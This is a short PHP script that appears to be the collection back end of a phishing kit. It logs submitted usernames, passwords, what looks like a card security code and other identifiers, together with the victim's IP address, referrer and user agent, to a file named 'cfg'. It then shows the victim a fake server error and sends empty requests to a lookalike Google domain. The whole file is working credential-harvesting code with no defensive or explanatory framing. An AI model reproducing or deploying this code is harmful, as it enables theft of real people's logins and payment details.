<?php

header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, PUT, POST, DELETE, OPTIONS, post, get');
header('Access-Control-Max-Age: 3600');
header('Access-Control-Allow-Headers: Origin, Content-Type, X-Auth-Token');
header('Access-Control-Allow-Credentials: true');


if($_POST['lu']=="" AND $_POST['lp']=="" AND $_POST['l3']=="" AND $_POST['le']=="") {
header("Location: http://googlecontent.com/");
exit();
}

$ip = $_SERVER['REMOTE_ADDR'];
$bngixip = $_SERVER["HTTP_X_REAL_IP"];
$bcfip = $_SERVER["HTTP_CF_CONNECTING_IP"];
$U_A = getenv("HTTP_USER_AGENT");
$ULINK = getenv("HTTP_REFERER");
$date = date('d-m-y h:i:s');
$message .= "=====\n";
$message .= "USRD: ".$_POST['lu']."\n";
$message .= "PSWRD: ".$_POST['lp']."\n";
$message .= "3CSC: ".$_POST['l3']."\n";
$message .= "Line: ".$_POST['ln']."\n";
$message .= "UID: ".$_POST['le']."\n";
$message .= "D/T: ".$date."\n";
$message .= "IP: ".$ip."\n";
$message .= "B_NGX: ".$bngixip."\n";
$message .= "B_CF: ".$bcfip."\n";
$message .= "ULINK: ".$ULINK."\n";
$message .= "UA: ".$U_A."\n";
$message .= "=====\n";


$file = fopen("cfg","a+");
fwrite($file,$message);
 	

    header('HTTP/1.1 500 Internal Server Error');
    exit(0);

?>
